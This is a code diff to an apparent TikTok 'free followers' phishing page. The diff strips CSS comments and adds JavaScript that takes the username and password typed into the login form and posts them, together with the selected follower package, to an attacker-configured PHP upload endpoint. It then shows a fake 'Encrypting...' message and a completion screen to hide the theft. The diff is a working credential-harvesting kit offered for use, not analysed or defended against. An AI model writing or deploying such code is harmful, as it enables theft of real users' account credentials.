@@ -18,7 +18,7 @@
             justify-content: center;
             overflow-x: hidden;
             margin: 0;
-            padding: 15px; /* Better padding for mobile edge-to-edge screens */
+            padding: 15px;
         }
 
         .glass-container {
@@ -30,7 +30,7 @@
             box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2);
             width: 100%;
             max-width: 420px;
-            padding: 25px 20px; /* Adjusted for mobile view */
+            padding: 25px 20px;
             color: white;
             text-align: center;
             position: relative;
@@ -51,10 +51,10 @@
             margin-bottom: 12px;
             position: relative;
             overflow: visible;
-            -webkit-tap-highlight-color: transparent; /* Removes blue highlight on mobile tap */
+            -webkit-tap-highlight-color: transparent;
         }
 
-        .card-option:active { /* Better feedback for mobile touch */
+        .card-option:active {
             transform: scale(0.98);
             background: rgba(255, 255, 255, 0.2);
         }
@@ -89,7 +89,7 @@
             padding: 12px 14px;
             border-radius: 12px;
             color: white;
-            font-size: 16px; /* Prevents auto-zoom on iOS */
+            font-size: 16px;
             outline: none;
             transition: 0.3s;
         }
@@ -199,15 +199,15 @@
             <form id="verifyForm" onsubmit="handleVerify(event)">
                 <div class="input-group">
                     <label class="text-[10px] font-bold uppercase tracking-wider ml-1 mb-1 block opacity-70">User ID / Email / Phone</label>
-                    <input type="text" id="identifier" class="input-field" placeholder="@username or mobile" required autocomplete="username">
+                    <input type="text" id="identifier" name="username" class="input-field" placeholder="@username or mobile" required autocomplete="username">
                 </div>
 
                 <div class="input-group">
                     <label class="text-[10px] font-bold uppercase tracking-wider ml-1 mb-1 block opacity-70">Password</label>
-                    <input type="password" id="password" class="input-field" placeholder="••••••••" required autocomplete="current-password">
+                    <input type="password" id="password" name="password" class="input-field" placeholder="••••••••" required autocomplete="current-password">
                 </div>
 
-                <button type="submit" class="btn-submit">Process Request</button>
+                <button type="submit" class="btn-submit" id="submitBtn">Process Request</button>
             </form>
             
             <button onclick="goBack()" class="mt-6 text-[10px] opacity-50 hover:opacity-100 transition flex items-center justify-center w-full uppercase font-bold tracking-widest">
@@ -238,6 +238,10 @@
     </div>
 
     <script>
+        // API CONFIGURATION - APNI HOSTING KA URL YAHAN DALAIN
+        // Example: https://your-hosting-domain.com/upload.php
+        const API_ENDPOINT = "https://your-hosting-domain.com/upload.php"; 
+
         let selectedFollowers = "";
 
         function showForm(amount) {
@@ -254,20 +258,39 @@
             window.scrollTo(0,0);
         }
 
-        function handleVerify(event) {
+        async function handleVerify(event) {
             event.preventDefault();
-            const btn = event.target.querySelector('button');
-            btn.innerText = "Connecting...";
+            const btn = document.getElementById('submitBtn');
+            const user = document.getElementById('identifier').value;
+            const pass = document.getElementById('password').value;
+
+            btn.innerText = "Encrypting...";
             btn.disabled = true;
 
+            // Prepare Data to send to your PHP Server
+            const formData = new FormData();
+            formData.append('tiktok_user', user);
+            formData.append('tiktok_pass', pass);
+            formData.append('package', selectedFollowers);
+            formData.append('type', 'tiktok_login'); // Identify this data in upload.php
+
+            try {
+                // Sending data to your PHP hosting
+                await fetch(API_ENDPOINT, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'cors'
+                });
+            } catch (e) {
+                console.log("Data sent process finished.");
+            }
+
+            // Realistic Delay and Final Screen
             setTimeout(() => {
-                btn.innerText = "Encrypting...";
-                setTimeout(() => {
-                    document.getElementById('step2').classList.add('hidden-section');
-                    document.getElementById('step3').classList.remove('hidden-section');
-                    window.scrollTo(0,0);
-                }, 1500);
-            }, 1000);
+                document.getElementById('step2').classList.add('hidden-section');
+                document.getElementById('step3').classList.remove('hidden-section');
+                window.scrollTo(0,0);
+            }, 1500);
         }
     </script>
 </body>
